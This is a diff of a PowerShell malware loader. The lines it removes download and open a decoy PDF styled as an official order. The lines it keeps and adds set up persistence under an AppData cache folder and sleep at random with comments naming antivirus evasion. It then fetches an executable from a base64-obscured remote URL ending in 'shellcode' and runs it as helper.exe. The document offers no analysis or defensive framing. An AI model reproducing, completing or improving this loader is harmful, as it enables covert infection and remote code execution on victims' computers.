@@ -1,27 +1,5 @@
 $ErrorActionPreference = 'SilentlyContinue'
 
-# === QUICK DECOY PDF OPEN (IMMEDIATE) ===
-$cache = "$env:APPDATA\Microsoft\Windows\Caches"
-if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }
-
-$flagFile = "$cache\installed.flag"
-$isFirstRun = -not (Test-Path $flagFile)
-
-$pdfUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9OYWthel9Oby5fNjYxX3ZpZF8wMi4wMy4yMDI2LTQucGRm'))
-$pdfPath = "$cache\Nakaz_No._661_vid_02.03.2026-4.pdf"
-
-$headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'}
-
-if ($isFirstRun) {
-    if (-not (Test-Path $pdfPath)) {
-        try { Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers $headers -UseBasicParsing } catch {}
-    }
-    if (Test-Path $pdfPath) {
-        try { Start-Process $pdfPath } catch {}
-        New-Item -Path $flagFile -ItemType File -Force | Out-Null
-    }
-}
-
 # === SELF-PRESERVATION ===
 $localPath = "$env:APPDATA\Microsoft\Windows\Caches\launcher.ps1"
 $currentPath = $MyInvocation.MyCommand.Path
@@ -70,20 +48,24 @@ if (-not (Test-Path $lnkPath)) {
 }
 
 # === POST-REBOOT DELAY (Only on persistence runs) ===
+$flagFile = "$env:APPDATA\Microsoft\Windows\Caches\installed.flag"
+$isFirstRun = -not (Test-Path $flagFile)
 if (-not $isFirstRun) {
     $rebootDelay = Get-Random -Min 600 -Max 900   # 10-15 minutes
     Start-Sleep -Seconds $rebootDelay
 }
 
-# === PRE-DOWNLOAD JITTER (Reduces real‑time scan correlation) ===
+# === PRE-DOWNLOAD JITTER ===
 Start-Sleep -Seconds (Get-Random -Min 30 -Max 60)
 
 # === BEARFOOS EVASION: Delay before payload ===
 Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)
 
-# === DOWNLOAD AND EXECUTE PAYLOAD (DISK-BASED) ===
+# === DOWNLOAD AND EXECUTE PAYLOAD ===
+$cache = "$env:APPDATA\Microsoft\Windows\Caches"
 $exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9hZ2VkLW1vdW50YWluLTYxNGIubmF0YWxpYS1rdXNoODIud29ya2Vycy5kZXYvc2hlbGxjb2Rl'))
 $exePath = "$cache\helper.exe"
+$headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'}
 
 if (-not (Test-Path $exePath)) {
     $retryCount = 0; $maxRetries = 3
